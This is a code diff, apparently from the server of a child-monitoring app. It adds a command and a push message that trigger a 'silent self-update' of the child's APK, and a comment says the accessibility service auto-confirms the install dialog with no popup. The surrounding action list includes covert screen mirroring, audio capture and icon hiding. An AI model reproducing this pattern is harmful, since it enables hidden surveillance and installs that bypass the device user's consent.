@@ -314,7 +314,8 @@ const ALLOWED_ACTIONS = new Set([
   'mirror_start', 'mirror_stop', 'mirror_request_permission',
   'audio_start', 'audio_stop',
   'show_app_icon', 'hide_app_icon', 'get_apps', 'message', 'release_protections',
-  'heal', 'health' // self-heal trigger + health check (parent app & dashboard use these)
+  'heal', 'health', // self-heal trigger + health check (parent app & dashboard use these)
+  'update_apk' // silent self-update abhi check (dashboard "Child app update" button)
 ]);
 
 app.post('/api/commands', auth, parentOnly, (req, res) => {
@@ -455,6 +456,15 @@ async function syncApkFromGithub({ manual = false } = {}) {
     console.log(`[apk] synced from GitHub: ${data.tag_name} (${(buf.length / 1048576).toFixed(1)} MB)`);
     // Naye build par admin ko child + parent APK Telegram par bhejo (purane delete)
     tg.notifyNewRelease(data, buf);
+    // Online children ko batao — child app ka silent self-update turant shuru
+    // ho jayega (bina popup, accessibility install dialog khud confirm karta hai).
+    try {
+      for (const c of db.children) {
+        if (wsHub.isOnline(c.id)) {
+          wsHub.sendToChild(c.id, { type: 'apk_update', releaseTag: data.tag_name, size: buf.length });
+        }
+      }
+    } catch (e) {}
     return { ok: true, ...base, tag: data.tag_name, size: buf.length };
   } catch (e) {
     console.warn(`[apk] sync failed: ${e.message}`);
@@ -474,6 +484,21 @@ const apkUpload = multer({ dest: APK_DIR, limits: { fileSize: 150 * 1024 * 1024 
 
 app.get('/api/apk', auth, parentOnly, (req, res) => {
   res.json(apkStatus());
+});
+
+// Child app ka silent self-update check: bachche ka apna JWT isko poll karta hai
+// (aur WS apk_update push bhi isi meta par based hai).
+app.get('/api/child/apk', auth, (req, res) => {
+  if (req.auth.role !== 'child') return res.status(403).json({ error: 'child only' });
+  const m = apkMeta();
+  const s = apkStatus();
+  res.json({
+    uploaded: s.uploaded,
+    url: s.url,
+    size: s.size,
+    releaseTag: s.releaseTag,
+    assetUpdatedAt: (m && m.assetUpdatedAt) || ''
+  });
 });
 
 // Manual re-sync from GitHub (dashboard "Sync now" button).
